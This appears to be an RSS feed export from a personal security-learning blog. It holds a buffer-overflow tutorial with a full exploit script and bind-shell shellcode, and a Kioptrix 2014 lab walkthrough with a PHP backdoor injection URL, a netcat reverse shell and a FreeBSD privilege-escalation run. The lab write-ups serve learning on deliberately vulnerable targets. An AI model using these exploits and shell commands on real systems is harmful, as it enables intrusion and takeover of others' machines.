@@ -1,0 +1,460 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Uncategorized &#8211; Graeme Robinson&#039;s blog</title>
+	<atom:link href="/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A place for my thoughts when I was starting to break into the information security feild</description>
+	<lastBuildDate>Fri, 20 Jul 2018 21:48:34 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.6.2</generator>
+	<item>
+		<title>Learning more about buffer overflow exploits</title>
+		<link>/learning-more-about-buffer-overflow-exploits/</link>
+					<comments>/learning-more-about-buffer-overflow-exploits/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Fri, 20 Jul 2018 21:48:34 +0000</pubDate>
+				<category><![CDATA[Buffer Overflow]]></category>
+		<category><![CDATA[Immunity]]></category>
+		<category><![CDATA[mona.py]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=342</guid>
+
+					<description><![CDATA[Preamble After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very &#8230; <a href="/learning-more-about-buffer-overflow-exploits/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<h1>Preamble</h1>
+<p>After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very interesting.</p>
+<p>I had heard about the <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">series of tutorials on the corelan blog</a> so I started to work through the first one and in doing so I hit a few problems and learned a few interesting things that I thought might be useful to others.</p>
+<p>After mentioning to a colleague that I was learning about exploit development, they mentioned that <a href="https://www.fuzzysecurity.com/tutorials/expDev/1.html">fuzzysecurity has some good exploit development tutorials</a> too, so I will check those out in parallel.</p>
+<p>Anyway, let&#8217;s get on with my experiences while following corelan&#8217;s &#8220;<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit writing tutorial part 1</a>&#8220;:</p>
+<h1>Setting up the environment</h1>
+<p>The first thing I had to do was get a Windows XP VM up and running, install the vulnerable version of &#8220;Easy RM to MP3 Converter&#8221; and create an m3u file that would cause the application to crash. I&#8217;ll explain how I got a copy of Windows XP running in a VM for free (I could probably get this through my MSDN subscription, but that&#8217;s not necessary) and how I downloaded the app and created the m3u exploit file (hint: I didn&#8217;t use the perl script in corelan&#8217;s article).</p>
+<h2>Windows XP VM</h2>
+<p>Microsoft offers <a href="https://www.microsoft.com/en-gb/download/details.aspx?id=8002">a Windows XP VM as a free download</a>. It is intended to be run in Windows 7, providing a way of running programs that run on XP, but won&#8217;t on Windows 7, for example 16 bit executables. This &#8220;feature&#8221; is called &#8220;XP Mode&#8221;.</p>
+<p>The download is an executable. If we inspect the exe file (using something like 7zip, don&#8217;t execute it!), we can extract the file &#8220;sources/xpm&#8221;, then rename it to xpm.cab and extract the &#8220;VirtualXPVHD&#8221; file from it. Rename this file to &#8220;VirtualXP.VHD&#8221; and then create a new VM in virtual box and use this file as the hard disk. It may be worth taking a snapshot before you start the VM because it will not be licensed and will stop working after 30 days. If you take a snapshot, you can revert it and get 30 days use out of it again.</p>
+<h2>Easy RM to MP3 Converter</h2>
+<p>I downloaded this from <a href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">here on exploit-db</a>. The link comes from <a href="https://www.exploit-db.com/exploits/9186/">this exploit page</a>.</p>
+<h2>Creating m3u that causes crash</h2>
+<p>I use both python and perl at work, but I have more experience in python and I prefer it, so I installed python (I installed version 2.7.15 because it&#8217;s the latest v2.x and it supports Windows XP, where the latest v3.x doesn&#8217;t support Windows XP) and ported the code from perl to python. This is what I used to create the first m3u file from the article:</p>
+<pre style="padding-left: 30px;">#!/usr/bin/env python
+
+
+with open("crash.m3u", "w") as file:
+    file.write("A" * 10000)
+
+
+print "m3u File Created successfully"</pre>
+<p>It doesn&#8217;t cause the crash, but if the number of &#8220;A&#8221;s is changed to 30000 then it will.</p>
+<h1>Debugging</h1>
+<p>I decided to use Immunity debugger because I think it has a nicer interface and can do more than Windbg. I also added mona.py (also from corelan) and used some of it&#8217;s features to make the process easier. The manual for mona.py which includes instructions to download and install it <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">can be found here</a>.</p>
+<h1>Finding the offset to overwrite EIP</h1>
+<p>This section details finding the exact place in the m3u file that we need to put the bytes that we want to end up in EIP. It starts off by splitting the 30000 bytes into two chunks; the first one is 25000 and the second one is 5000. Then after determining that the bytes from the second (smaller) chunk are placed in EIP, a more accurate method is used to find the exact bytes.<strong> I tried to skip this step, which gave me incorrect results and it took me quite some time to figure out why. </strong>I&#8217;ll explain what tripped me up:</p>
+<p>The article explains how to use a tool from the Metasploit framework to generate a pattern where the exact offset of a string of bytes can be identified. Incidentally, this syntax for this tool has changed, and it has moved in Kali (the successor to Backtrack, which it looks like is being used in this article). In Kali, it can be found at /usr/share/metasploit-framework/tools/exploit/pattern_create.rb but there is a symlink to it at /usr/bin/msf-pattern_create, so it can be run by just typing &#8220;msf-pattern_create&#8221;. I decided that since I have mona.py installed, I would just use that tool since it meant I didn&#8217;t need to start my Kali VM. I used mona.py to create a 30000 byte pattern using the command &#8220;!mona pc 30000&#8221; in Immunity debugger. A pattern is output to the log, but it&#8217;s truncated, so it can be copied from &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt&#8221;.</p>
+<p>I stuck this pattern in my python file and created a new m3u like this:</p>
+<pre>#!/usr/bin/env python
+
+
+PATTERN = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...Ml1Ml2Ml3Ml4Ml5Ml6Ml7Ml8Ml9"
+
+
+with open("crash.m3u", "w") as file:
+file.write(PATTERN) 
+
+
+print "m3u File Created successfully"</pre>
+<p>and when I opened that file with Immunity attached, I saw the bytes &#8220;48386B48&#8221; in EIP. I used mona.py to locate those bytes (using the command &#8220;!mona po 48386B48&#8221;) in the pattern and it said they were at offset 5784. When I changed the bytes at that position in the m3u file, it didn&#8217;t make a difference to EIP shown in Immunity when I reloaded the file. I eventually discovered that the pattern created by Metasploit and mona is only 20,280 (26*26*10*3) bytes long and after that it starts again. The byte pattern in EIP was indeed the same as at offset 5784, but it was also at offset 26064 (5784 + 20280) and those are the bytes that made it into EIP! I should have just followed the steps, but I did end up learning the limitations of that pattern generator and offset locator.</p>
+<h1>\xCC AKA INT3 aka &#8220;break&#8221;</h1>
+<p>The article skips over what this mysterious \xCC byte does. A quick google search led me to <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT_3">an article on wikipedia</a> that explained that it&#8217;s special single byte interrupt instruction for use by debuggers, so when the program hits this instruction, Immunity will pause execution so we can inspect the state of the registers and memory. Very useful!</p>
+<h1>Finding a JMP ESP instruction</h1>
+<p>The article covers how to find a JMP ESP instruction using Windbg, but not Immunity. I turned to mona.py again and used the command:</p>
+<pre>!mona f -type instr -s "jmp esp" -o -cp nonull</pre>
+<p>&#8230;which showed me some location in the log, but also wrote them to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\find.txt&#8221;</p>
+<h2>Creating my own Shellcode using Metasploit</h2>
+<p>I tried creating my own shellcode to spawn calc using &#8220;msfvenom -p windows/exec -f python&#8221;, but it didn&#8217;t work. Looking in the debugger, I could see that my Shellcode was being truncated. This was because my shellcode contained at least one null byte (\x00), but that wasn&#8217;t the only byte that caused the shellcode to become truncated, as I found out when I removed the null bytes. The article didn&#8217;t make it clear, but I would have to specify which bytes to exclude from the shellcode. Of course, I could use the the alpha_upper encoder which is shown later in the article, but I wanted to have a small shellcode. To find the bad bytes, I wanted to create a sequence of bytes 00 to FF and put them in the m3u file. I created the sequence of bytes again using mona.py. The command was &#8220;!mona ba&#8221; and mona would output to the log, but also to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.txt&#8221; and I could stick that in my python script so that it would be written in the m3u file. Every time I saw a byte cause truncation or get swapped with another byte, I would add that to the list of bad chars for msfvenom to avoid. I ended up actually only finding two bad bytes; \x00 \x0A. To generate my own shellcode that spawned calc, I ran this command:</p>
+<pre>msfvenom -p windows/exec -f python -b "\x00\x0a" CMD=calc</pre>
+<h1>Completed python script to create bind shell exploit</h1>
+<pre>#!/usr/bin/env python
+
+# msfvenom -p windows/shell_bind_tcp -e x86/alpha_upper -f python EXITFUNC=seh
+buf = ""
+buf += "\x89\xe3\xda\xdc\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
+buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
+buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
+buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
+buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
+buf += "\x4a\x49\x4b\x4c\x4d\x38\x4b\x32\x55\x50\x35\x50\x35"
+buf += "\x50\x55\x30\x4b\x39\x4b\x55\x36\x51\x39\x50\x52\x44"
+buf += "\x4c\x4b\x36\x30\x46\x50\x4c\x4b\x46\x32\x44\x4c\x4c"
+buf += "\x4b\x50\x52\x32\x34\x4c\x4b\x33\x42\x57\x58\x34\x4f"
+buf += "\x4e\x57\x50\x4a\x56\x46\x50\x31\x4b\x4f\x4e\x4c\x57"
+buf += "\x4c\x35\x31\x33\x4c\x35\x52\x56\x4c\x47\x50\x4f\x31"
+buf += "\x58\x4f\x54\x4d\x55\x51\x58\x47\x5a\x42\x4c\x32\x31"
+buf += "\x42\x51\x47\x4c\x4b\x36\x32\x52\x30\x4c\x4b\x31\x5a"
+buf += "\x57\x4c\x4c\x4b\x50\x4c\x52\x31\x53\x48\x4a\x43\x37"
+buf += "\x38\x53\x31\x48\x51\x46\x31\x4c\x4b\x36\x39\x31\x30"
+buf += "\x33\x31\x58\x53\x4c\x4b\x57\x39\x52\x38\x4b\x53\x37"
+buf += "\x4a\x47\x39\x4c\x4b\x47\x44\x4c\x4b\x33\x31\x49\x46"
+buf += "\x56\x51\x4b\x4f\x4e\x4c\x39\x51\x38\x4f\x54\x4d\x43"
+buf += "\x31\x48\x47\x47\x48\x4d\x30\x52\x55\x4b\x46\x33\x33"
+buf += "\x43\x4d\x5a\x58\x57\x4b\x53\x4d\x47\x54\x34\x35\x5a"
+buf += "\x44\x50\x58\x4c\x4b\x30\x58\x47\x54\x33\x31\x59\x43"
+buf += "\x43\x56\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x46\x38\x35"
+buf += "\x4c\x33\x31\x39\x43\x4c\x4b\x44\x44\x4c\x4b\x35\x51"
+buf += "\x58\x50\x4c\x49\x30\x44\x47\x54\x36\x44\x31\x4b\x31"
+buf += "\x4b\x45\x31\x30\x59\x31\x4a\x46\x31\x4b\x4f\x4b\x50"
+buf += "\x51\x4f\x31\x4f\x51\x4a\x4c\x4b\x45\x42\x5a\x4b\x4c"
+buf += "\x4d\x51\x4d\x42\x48\x47\x43\x36\x52\x43\x30\x55\x50"
+buf += "\x32\x48\x42\x57\x32\x53\x57\x42\x31\x4f\x31\x44\x42"
+buf += "\x48\x50\x4c\x54\x37\x37\x56\x34\x47\x4b\x4f\x4e\x35"
+buf += "\x48\x38\x4a\x30\x43\x31\x45\x50\x45\x50\x56\x49\x49"
+buf += "\x54\x56\x34\x30\x50\x33\x58\x57\x59\x4d\x50\x32\x4b"
+buf += "\x35\x50\x4b\x4f\x59\x45\x42\x4a\x53\x38\x51\x49\x36"
+buf += "\x30\x5a\x42\x4b\x4d\x57\x30\x46\x30\x57\x30\x30\x50"
+buf += "\x32\x48\x5a\x4a\x44\x4f\x59\x4f\x4b\x50\x4b\x4f\x48"
+buf += "\x55\x5a\x37\x33\x58\x44\x42\x43\x30\x54\x51\x31\x4c"
+buf += "\x4d\x59\x4d\x36\x52\x4a\x44\x50\x51\x46\x46\x37\x32"
+buf += "\x48\x39\x52\x49\x4b\x46\x57\x55\x37\x4b\x4f\x39\x45"
+buf += "\x30\x57\x45\x38\x58\x37\x5a\x49\x37\x48\x4b\x4f\x4b"
+buf += "\x4f\x38\x55\x46\x37\x43\x58\x34\x34\x5a\x4c\x57\x4b"
+buf += "\x4d\x31\x4b\x4f\x4e\x35\x31\x47\x5a\x37\x45\x38\x32"
+buf += "\x55\x42\x4e\x50\x4d\x43\x51\x4b\x4f\x48\x55\x33\x58"
+buf += "\x42\x43\x32\x4d\x32\x44\x43\x30\x4b\x39\x4a\x43\x51"
+buf += "\x47\x31\x47\x51\x47\x56\x51\x4c\x36\x42\x4a\x34\x52"
+buf += "\x51\x49\x30\x56\x4d\x32\x4b\x4d\x45\x36\x49\x57\x57"
+buf += "\x34\x57\x54\x47\x4c\x33\x31\x53\x31\x4c\x4d\x47\x34"
+buf += "\x37\x54\x44\x50\x48\x46\x45\x50\x51\x54\x31\x44\x30"
+buf += "\x50\x56\x36\x50\x56\x51\x46\x51\x56\x51\x46\x30\x4e"
+buf += "\x50\x56\x56\x36\x51\x43\x56\x36\x53\x58\x54\x39\x38"
+buf += "\x4c\x57\x4f\x4c\x46\x4b\x4f\x48\x55\x4b\x39\x4d\x30"
+buf += "\x50\x4e\x50\x56\x37\x36\x4b\x4f\x46\x50\x52\x48\x43"
+buf += "\x38\x4c\x47\x45\x4d\x45\x30\x4b\x4f\x49\x45\x4f\x4b"
+buf += "\x4b\x4e\x44\x4e\x47\x42\x4b\x5a\x53\x58\x4e\x46\x4a"
+buf += "\x35\x4f\x4d\x4d\x4d\x4b\x4f\x38\x55\x57\x4c\x54\x46"
+buf += "\x53\x4c\x45\x5a\x4b\x30\x4b\x4b\x4b\x50\x42\x55\x54"
+buf += "\x45\x4f\x4b\x31\x57\x54\x53\x52\x52\x52\x4f\x42\x4a"
+buf += "\x35\x50\x50\x53\x4b\x4f\x4e\x35\x41\x41"
+
+with open(r"c:\documents and settings\administrator\desktop\mal.m3u", "w") as file:
+    file.write(26064 * "A")
+    file.write("\x2a\xb2\xd4\x01") # JMP ESP
+    file.write("\x90" * 25) # NOP * 25
+    file.write(buf)
+
+print "Done"</pre>
+]]></content:encoded>
+					
+					<wfw:commentRss>/learning-more-about-buffer-overflow-exploits/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Kioptrix 2014</title>
+		<link>/kioptrix-2014/</link>
+					<comments>/kioptrix-2014/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 12 Oct 2017 20:48:43 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<guid isPermaLink="false">/?p=312</guid>
+
+					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
+<p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
+<p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
+<p>After starting the VM, I had to find the system&#8217;s IP address, so I ran netdiscover and it was quickly found. To find the open ports and identify the services, I ran nmap:</p>
+<pre>root@kali:~# nmap [IP-REDACTED] -sV
+
+Starting Nmap 7.40 ( https://nmap.org/ ) at 2017-10-11 15:59 EDT
+Nmap scan report for kioptrix2014.lan ([IP-REDACTED])
+Host is up (0.00044s latency).
+Not shown: 997 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp closed ssh
+<strong>80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
+<strong>8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
+MAC Address: 08:00:27:DC:55:1C (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds</pre>
+<p>Opening a web browser on port 8080 shows a 403 forbidden error message. Nothing too interesting in the response. The page returned on port 80 is more interesting though&#8230; When rendered, it&#8217;s just a heading that says &#8220;It works!&#8221;, but the source includes a commented out &lt;meta refresh&gt; that would redirect the browser to http://[IP-REDACTED]/pChart2.1.3/examples/index.php.</p>
+<p>Initially, I thought I could inject some PHP in here. For example if I went to the sandbox and  changed my chart title to <strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong> then clicked the &#8220;Show code&#8221; button, it showed me that one line of code that would run would be</p>
+<pre>$myPicture-&gt;drawText(350,25,"-".shell_exec("whoami")."-",$TextSettings);</pre>
+<p>but when I clicked &#8220;Render picture&#8221;, the title was<strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong>, so it must have escaped it somehow when it really made the picture. Damn.</p>
+<p>Next thing to try is looking for a known exploit for pChart:</p>
+<pre>root@kali:~# searchsploit pchart
+--------------------------------------------- ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+--------------------------------------------- ----------------------------------
+pChart 2.1.3 - Multiple Vulnerabilities | php/webapps/31173.txt
+--------------------------------------------- ----------------------------------</pre>
+<p>That txt file suggests that I can read any file on the system that the account running apache can read using a maliciously crafted url, for example http://[IP-REDACTED]/examples/index.php?Action=View&amp;Script=/etc/passwd</p>
+<p>Interestingly, we can see how this exploit works by examining the first line of index.php, which can be seen by visiting http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action=View&amp;Script=index.php , which is:</p>
+<pre>&lt;?php if ( isset($_GET["Action"])) { $Script = $_GET["Script"]; highlight_file($Script); exit(); } ?&gt;</pre>
+<p>. We don&#8217;t even really need a value set for &#8220;Action&#8221;; http://[IP-REDACTED]/pChart2.1.3/examples/index.php?<strong>Action</strong>&amp;Script=index.php works just as well.</p>
+<p>Anyway, there&#8217;s not much of great interest that this account can access, but perhaps we can find out why we are seeing a 403 forbidden response when we connect to port 8080&#8230;</p>
+<p><a href="https://www.freebsd.org/doc/handbook/network-apache.html">The apache config file on FreeBSD is located in /usr/local/etc/apache2x/httpd.conf</a>, (on this system, since it&#8217;s apache 2.2, we should replace the &#8220;x&#8221; with a &#8220;2&#8221;) so we&#8217;ll look at that with http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action&amp;Script=/usr/local/etc/apache22/httpd.conf and at the bottom of the file is:</p>
+<pre>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
+
+&lt;VirtualHost *:8080&gt;
+    DocumentRoot /usr/local/www/apache22/data2
+
+&lt;Directory "/usr/local/www/apache22/data2"&gt;
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+&lt;/Directory&gt;</pre>
+<p>This tells us that port 8080 is serving files from /usr/local/www/apache22/data2, and that requests will only be allowed if the user agent starts with &#8220;Mozilla/4.0 Mozilla4_browser&#8221; . See https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html and http://httpd.apache.org/docs/current/mod/mod_access_compat.html#allow for more details of how that works.</p>
+<p>Changing our user agent to &#8220;Mozilla/4.0 Mozilla4_browser_NOT REALLY!&#8221; makes apache respond to our requests to port 80, and the response says that there is a directory called phptax. This shows us a very ugly and dated web application that I clicked around, but couldn&#8217;t find anything interesting, so I used searchsploit again:</p>
+<pre>root@kali:~# searchsploit phptax
+------------------------------------------------------------------ ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------ ----------------------------------
+PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/21833.rb
+phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
+PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
+------------------------------------------------------------------ ----------------------------------</pre>
+<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
+<p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
+<pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
+<p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
+<pre>root@kali:~# searchsploit -t FreeBSD 9
+------------------------------------------------------------------------- ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------------- ----------------------------------
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20810.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20811.cpp
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20812.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20813.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20814.c
+FreeBSD 9.1 ftpd - Remote Denial of Service | freebsd/dos/24450.txt
+FreeBSD mcweject 0.9 (eject) - Buffer Overflow Privilege Escalation | bsd/local/3578.c
+BSD/OS 2.1 / DG/UX 4.0 / Debian 0.93 / Digital UNIX 4.0 B / FreeBSD 2.1. | unix/local/19203.c
+FreeBSD 9.0 &lt; 9.1 mmap/ptrace - Privilege Escalation | freebsd/local/26368.c
+FreeBSD 9 - Address Space Manipulation Privilege Escalation (Metasploit) | freebsd/local/26454.rb
+FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | freebsd/local/28718.c
+FreeBSD/x86 - rev connect_ recv_ jmp_ return results Shellcode (90 bytes | freebsd_x86/shellcode/13265.c
+FreeBSD/x86 - Rortbind Reverse 127.0.0.1:8000 /bin/sh Shellcode (89 byte | freebsd_x86/shellcode/13267.asm
+------------------------------------------------------------------------- ----------------------------------</pre>
+<p>26368 looks promising, let&#8217;s send it to the remote machine. I ran this on my attacking machine:</p>
+<pre>searchsploit -m 26368;nc -vnlp 6666 &lt;26368.c</pre>
+<p>then ran this on the remote system:</p>
+<pre>nc 192.168.23.120 6666 &gt;26368.c</pre>
+<p>and after a few seconds, I hit CTRL+C to close the nc session. Not I have the exploit on the FreeBSD system, so I can compile it and run it:</p>
+<pre>gcc 26368.c -o 26368
+./26368
+whoami
+root</pre>
+<p>We&#8217;ve got root! Inside root&#8217;s home directory is a nice txt file with some interesting information that we can read using cat</p>
+<p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/kioptrix-2014/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>New alternate emoji domain</title>
+		<link>/new-alternate-emoji-domain/</link>
+					<comments>/new-alternate-emoji-domain/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Wed, 16 Aug 2017 14:27:14 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=307</guid>
+
+					<description><![CDATA[This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post. I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud &#8230; <a href="/new-alternate-emoji-domain/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post.</p>
+<p>I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud owner of <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f4bb.png" alt="💻" class="wp-smiley" style="height: 1em; max-height: 1em;" />☠.ws, which mirrors this site.</p>
+<p>Now, if you go to grobinson.me and your browser supports emoji domains without displaying the punycode translation (xn--h4h3030o.ws) in the address bar, you will be redirected to the same page on <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f4bb.png" alt="💻" class="wp-smiley" style="height: 1em; max-height: 1em;" />☠.ws thanks to <a href="https://github.com/jonroig/emojiurlifier">this little piece of javascript</a>.</p>
+<p>Check your address bar now. You may already using the emoji domain without even knowing.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/new-alternate-emoji-domain/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Hack the Box</title>
+		<link>/hack-the-box/</link>
+					<comments>/hack-the-box/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Mon, 26 Jun 2017 16:33:20 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=290</guid>
+
+					<description><![CDATA[I recently came across Hack The Box and have been having fun pwning some of those machines using the techniques that I have learned in the free Metasploit Unleashed course. Metasploit really is a great tool, and even though I could have &#8230; <a href="/hack-the-box/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>I recently came across <a href="https://www.hackthebox.eu/">Hack The Box</a> and have been having fun pwning some of those machines using the techniques that I have learned in the free <a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a> course. Metasploit really is a great tool, and even though I could have got some &#8220;user owns&#8221; without it, I found that once I had learned how to use things like msfvenom, it saved me having to write some of my own trivial scripts, which saved me time.</p>
+<p>I&#8217;ve currently got 3 &#8220;System Owns&#8221; and 4 &#8220;User Owns&#8221;, which puts me on &#8220;Script Kiddie&#8221; status. I&#8217;m hoping to get a few more and move to a better status fairly quickly, if I can find the time to play around some more.</p>
+<p>I especially like the way you have to <a href="https://www.hackthebox.eu/en/invite">hack the invite</a> before you can gain access to any machines. It was probably the easiest part of any of the challenges I have attempted, but that might be because I&#8217;m pretty familiar with web technologies.</p>
+<p>If you haven&#8217;t tried it out, I would encourage you to do so. The website is <strong>very</strong> polished, and there are quite a lot of machines to attack <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/hack-the-box/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>I have a Raspberry PI on the way</title>
+		<link>/i-have-a-raspberry-pi-on-the-way/</link>
+					<comments>/i-have-a-raspberry-pi-on-the-way/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 06 Jan 2013 16:39:02 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=238</guid>
+
